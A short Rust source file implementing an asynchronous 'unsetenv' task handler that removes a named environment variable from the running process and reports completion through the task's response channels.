use crate::structs::Task;
use serde::Deserialize;

#[derive(Deserialize)]
struct UnsetenvArgs {
    name: String,
}

pub async fn execute(task: Task) {
    let mut response = task.new_response();

    let args: UnsetenvArgs = match serde_json::from_str(&task.data.params) {
        Ok(a) => a,
        Err(_) => UnsetenvArgs { name: task.data.params.clone() },
    };

    std::env::remove_var(&args.name);
    response.user_output = format!("Unset {}", args.name);
    response.completed = true;

    let _ = task.job.send_responses.send(response).await;
    let _ = task.remove_running_task.send(task.data.task_id.clone()).await;
}
